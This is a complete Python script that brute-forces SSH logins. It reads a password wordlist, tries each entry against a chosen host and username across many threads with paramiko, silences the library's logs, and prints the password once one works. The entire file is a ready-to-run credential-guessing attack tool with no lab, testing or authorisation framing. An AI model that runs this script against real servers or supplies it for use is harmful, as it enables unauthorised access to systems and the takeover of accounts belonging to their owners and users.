# brute_threaded.py
import paramiko
import logging
import threading
import queue
import time

logging.getLogger("paramiko").setLevel(logging.CRITICAL)

def try_login(host, port, username, password, timeout=3.0):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(host, port=port, username=username, password=password,
                       timeout=timeout, allow_agent=False, look_for_keys=False)
        return "success"
    except paramiko.AuthenticationException:
        return "failure"
    except Exception:
        return "error"
    finally:
        client.close()

def worker(host, port, username, q, stop_event, lock):
    # Keep grabbing passwords from the queue until it's empty or we're done
    while not stop_event.is_set():
        try:
            password = q.get(block=False)  # Get next password; raises Empty if queue is empty
        except queue.Empty:
            return  # No more passwords — this thread is done

        result = try_login(host, port, username, password)

        if result == "success":
            # Use a lock so only one thread prints the result
            with lock:
                if not stop_event.is_set():  # Make sure we're the first to find it
                    stop_event.set()          # Signal all other threads to stop
                    print(f"\n\n[+] FOUND! Password is: {password}")

host      = input("Host: ").strip()
port      = int(input("Port [22]: ").strip() or "22")
username  = input("Username: ").strip()
wordlist  = input("Wordlist [wordlist.txt]: ").strip() or "wordlist.txt"
n_threads = int(input("Threads [10]: ").strip() or "10")

with open(wordlist) as f:
    passwords = [line.strip() for line in f if line.strip()]

# Fill the queue with all passwords
q = queue.Queue()
for pw in passwords:
    q.put(pw)

stop_event = threading.Event()  # Shared stop signal
lock       = threading.Lock()   # Prevents garbled output from simultaneous prints

print(f"\n[*] Scanning {len(passwords)} passwords with {n_threads} threads...\n")
start = time.time()

threads = [
    threading.Thread(target=worker, args=(host, port, username, q, stop_event, lock), daemon=True)
    for _ in range(n_threads)
]
for t in threads:
    t.start()
for t in threads:
    t.join()

print(f"[*] Done in {time.time() - start:.2f}s")